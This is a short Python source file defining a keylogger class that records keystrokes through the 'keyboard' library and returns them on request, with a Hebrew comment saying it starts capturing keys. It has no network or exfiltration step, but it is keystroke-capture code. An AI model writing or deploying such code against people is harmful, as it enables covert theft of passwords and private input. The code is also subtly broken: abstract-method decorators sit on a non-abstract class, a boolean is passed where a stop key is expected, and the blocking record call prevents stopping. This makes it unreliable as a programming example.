from abc import abstractmethod, ABC
import keyboard
class KeyLoggerService:
    def __init__(self):
        self.fleg = False
        self.keys = []


    @abstractmethod
    def start_logging(self)-> None:
        self.keys = keyboard.record(until= self.fleg)


    @abstractmethod
    def stop_logging(self):
        self.fleg = True


    @abstractmethod
    def get_logged_keys(self) -> list:
        requested_keys = self.keys
        self.keys = []
        return requested_keys
# מתחיל ללכוד את המקשים

# start_logging()
# stop_logging()
# get_logged_keys()